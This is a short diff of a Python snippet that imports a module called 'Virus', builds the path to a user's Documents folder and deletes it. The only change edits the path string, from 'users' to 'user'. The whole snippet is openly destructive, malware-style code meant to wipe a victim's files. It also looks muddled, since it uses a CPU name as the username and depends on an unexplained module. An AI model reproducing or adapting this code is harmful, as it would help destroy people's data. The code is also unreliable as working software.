@@ -1,5 +1,5 @@
 import Virus
 user = Virus.getCPUname()
-Form = "C:/users/{}/documents"
+Form = "C:/user/{}/documents"
 APD = Form.format(user)
 Virus.delete(APD)
